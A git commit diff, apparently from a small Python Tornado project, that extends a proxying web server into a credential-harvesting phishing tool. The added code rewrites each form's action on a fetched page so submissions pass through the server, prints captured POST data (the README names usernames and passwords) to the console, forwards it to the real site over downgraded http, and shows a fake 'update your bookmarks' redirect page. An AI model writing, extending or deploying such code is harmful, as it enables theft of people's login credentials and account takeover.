2edf3b95548c22b22fdb13c0caa9986ee31c6b08
System Administrator <keith.lee2012@gmail.com>
2014-12-15 05:26:29 +0800

    adds interaction for POST request and redirection after capturing credentials

--- README.md
+++ README.md
@@ -11,5 +11,4 @@ Example:
 http://127.0.0.1:8000/query?uuid=931d7f60-65c4-01-d861-3c15c2ccadba&url=aHR0cDovL3d3dy50b3JuYWRvd2ViLm9yZy9lbi9icmFuY2gyLjEvLy8vaW50ZWdyYXRpb24uaHRtbA==
 
 Upon base64 decoding, the parameter url translates to http://www.tornadoweb.org/en/branch2.1////integration.html.  
-
- 
+Displays the URL and POST data (e.g. usernames and passwords) to console, redirects the browser to the actual target website.  
--- webserver.py
+++ webserver.py
@@ -9,6 +9,29 @@ import base64
 import binascii
 import re
 from lxml import etree, html
+import sys
+
+def extractForm(url,decodeBase64Url,uuid,requestHost):
+    if "https://" in decodeBase64Url or "http://" in decodeBase64Url:
+
+    #print "here: "+decodeBase64Url
+    #filename = urllib2.unquote(decodeBase64Url).decode('utf8').split('/')[-1]
+    #fullUrlPath = decodeBase64Url.replace(filename,"")
+
+    	match = re.search(r'action=[\'"]?([^\'" >]+)', url)
+    	if match:
+        	result = match.group(0)
+		#result=result.replace('https:','http:')
+		result=result.replace('action="','')
+		
+		encodeUrl = base64.b64encode(result.replace("https:","http:"))
+		newUrl = "http://"+requestHost+"/query?uuid="+uuid+"&url="+encodeUrl
+
+		returnStr = url.replace(result,newUrl)	
+		#returnStr = url.replace(str(result.encode('utf-8')),str(newUrl.encode('utf-8')))	
+		#print "url: "+url
+		#print "result: "+result
+		return returnStr
 
 def extractUrl(url,decodeBase64Url,uuid,requestHost):
     filename = urllib2.unquote(decodeBase64Url).decode('utf8').split('/')[-1]
@@ -18,7 +41,7 @@ def extractUrl(url,decodeBase64Url,uuid,requestHost):
     if match:
         result = match.group(0)
 	result1=result.replace('href="','')
-	if ".ico" in result1 or ".js" in result1 or ".css" in result1:
+	if ".ico" in result1 or ".js" in result1 or ".css" in result1 or ".svg" in result1:
 		if "http://" not in result1 and "https://" not in result1:
 			newUrl = fullUrlPath+"/"+result1
 			returnStr = url.replace(str(result.encode('utf-8')),'href="'+str(newUrl.encode('utf-8')))
@@ -35,9 +58,25 @@ def extractUrl(url,decodeBase64Url,uuid,requestHost):
 			returnStr = url.replace(str(result.encode('utf-8')),'href="'+str(newUrl.encode('utf-8')))
 	return returnStr
 
-def getPageContents(url):
+def postForm(url,postData):
+    print url
+    print postData
+    statusCode = 301    
     h = httplib2.Http(".cache")
-    resp, content = h.request(url, "GET")
+    resp, content = h.request(url, "POST", postData)
+    url = resp['location']
+    cookie = resp['set-cookie']
+    while statusCode!=200:
+	resp, content = h.request(url, headers={"set-cookie":cookie})
+	url = resp['content-location']
+	cookie = resp['set-cookie']
+    	statusCode = resp.status
+    return url,content
+
+def getPageContents(url,userAgent):
+    h = httplib2.Http(".cache")
+    resp, content = h.request(url, headers={"user-agent":userAgent})
+    #resp, content = h.request(url, "GET")
     return content
 
 def testUrl(url,search=re.compile(r'[^a-z0-9./:]#').search):
@@ -49,20 +88,36 @@ class MainHandler(tornado.web.RequestHandler):
 	#self.write(self.request.remote_ip)
 
 class AnswerHandler(tornado.web.RequestHandler):
+    def post(self):
+	uuid = self.get_argument('uuid',True)
+	base64Url = self.get_argument('url',True)
+	decodeBase64Url = base64.b64decode(base64Url)
+
+	if testUrl(decodeBase64Url)==True:
+		#print uuid
+		#print decodeBase64Url
+		#print self.request.body
+		url,content=postForm(decodeBase64Url,self.request.body)
+		self.write('<html><head><script type="text/javascript">function delayer(){ window.location = "https://www.facebook.com"}</script></head><body onLoad="setTimeout(\'delayer()\', 5)"><h2>Prepare to be redirected!</h2><p>This page is a time delay redirect, please update your bookmarks to our new location!</p></body></html>')
+
     def get(self):
+	#print self.request.headers["User-Agent"]
 	#print self.request.uri
 	#print self.request.host
 
 	uuid = self.get_argument('uuid',True)
 	base64Url = self.get_argument('url',True)
 	decodeBase64Url = base64.b64decode(base64Url)
+
 	if testUrl(decodeBase64Url)==True:
-		html1 = getPageContents(decodeBase64Url)
+		html1 = getPageContents(decodeBase64Url, self.request.headers["User-Agent"])
 		document_root = html.fromstring(html1)
 		prettyHTML=etree.tostring(document_root, encoding='unicode', pretty_print=True)
 		list1 = prettyHTML.split("\n")
 		resultList=[]
 		for x in list1:
+			if 'action="' in x:
+				resultList.append(str(extractForm(str(x.encode('utf-8')),decodeBase64Url,uuid,self.request.host)))
 			if 'href="' in x:
 				resultList.append(str(extractUrl(str(x.encode('utf-8')),decodeBase64Url,uuid,self.request.host)))
 			else:
